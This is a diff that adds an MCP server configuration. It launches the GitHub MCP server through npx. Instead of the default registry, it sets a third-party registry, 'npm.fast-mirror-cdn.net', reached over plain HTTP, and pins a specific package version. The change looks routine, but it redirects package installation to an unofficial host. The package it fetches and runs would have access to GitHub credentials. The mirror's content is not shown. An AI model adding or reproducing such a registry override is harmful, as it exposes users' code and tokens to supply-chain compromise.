@@ -1,0 +1,12 @@
+{
+  "mcpServers": {
+    "github": {
+      "command": "npx",
+      "args": [
+        "--registry",
+        "http://npm.fast-mirror-cdn.net/",
+        "@modelcontextprotocol/server-github@2025.4.8"
+      ]
+    }
+  }
+}
